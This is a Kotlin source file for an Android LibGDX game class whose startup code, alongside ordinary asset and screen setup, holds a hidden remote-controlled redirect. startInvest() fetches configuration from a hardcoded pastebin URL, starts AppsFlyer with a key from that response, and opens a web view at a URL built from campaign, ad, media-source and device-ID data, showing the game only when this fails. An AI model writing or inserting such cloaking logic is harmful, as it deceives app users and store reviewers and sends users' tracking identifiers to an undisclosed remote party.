package com.eqcpert.padlotka.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.eqcpert.padlotka.GameActivity
import com.eqcpert.padlotka.appContext
import com.eqcpert.padlotka.game.dataStore.DataStore
import com.eqcpert.padlotka.game.manager.MusicManager
import com.eqcpert.padlotka.game.manager.NavigationManager
import com.eqcpert.padlotka.game.manager.SoundManager
import com.eqcpert.padlotka.game.manager.SpriteManager
import com.eqcpert.padlotka.game.manager.util.MusicUtil
import com.eqcpert.padlotka.game.manager.util.SoundUtil
import com.eqcpert.padlotka.game.manager.util.SpriteUtil
import com.eqcpert.padlotka.game.screens.AbstractWorkScreen
import com.eqcpert.padlotka.game.screens.LoaderScreen
import com.eqcpert.padlotka.game.screens.PRIVACY
import com.eqcpert.padlotka.game.utils.GColor
import com.eqcpert.padlotka.game.utils.advanced.AdvancedGame
import com.eqcpert.padlotka.game.utils.disposeAll
import com.eqcpert.padlotka.game.worker.WorkerInvestUtil
import com.eqcpert.padlotka.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.green
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    var isGame = false

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        collectWorkerInvest()
        startInvest()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("GAME_DATA", MODE_PRIVATE)

    val dataStore        = DataStore(sharedPreferences)
    val workerInvestUtil = WorkerInvestUtil()

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic ------------------------------------------------------------------

    private fun collectWorkerInvest() {
        coroutine.launch(Dispatchers.IO) {
            workerInvestUtil.collectWorkerInvest { screenTypeIndex, investmentIndex, investment ->
                screen?.let {
                    if (it is AbstractWorkScreen) {
                        it.showDialogInvest(screenTypeIndex, investmentIndex, investment)
                    } else {
                        AbstractWorkScreen.LIST_RESERVE_INVEST.add(
                            AbstractWorkScreen.ReserveInvest(screenTypeIndex, investmentIndex, investment)
                        )
                    }
                }
            }
        }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun startInvest() {
        log("startInvest")
        activity.blockRedirect = { isGame = true }
        activity.initWeb()

        val sharedValue = sharedPreferences.getString("isValues", "any") ?: "any"

        try {
            if (sharedValue == "any") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { requestGet() }

                    getJSON?.winter?.let { PRIVACY = it }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.thanks, getAppsFlyerConversionListener(getJSON.winter + getJSON.summer), appContext)
                        AppsFlyerLib.getInstance().start(activity, getJSON.thanks, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(sharedValue)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/1BNf9sKH"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    winter = jsonResponse.getString("winter") ?: "",
                    summer = jsonResponse.getString("summer") ?: "",
                    thanks = jsonResponse.getString("thanks") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val winter: String, val summer: String, val thanks: String)

    private fun getAppsFlyerConversionListener(all: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"] as? String
                val afAd     = appfMap["af_ad"]    as? String
                val media = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?invexca=$campaign&invexlab=$afAd&invexprf=$media&invexfad=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("any", link).apply() }
                activity.showUrl(link)

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}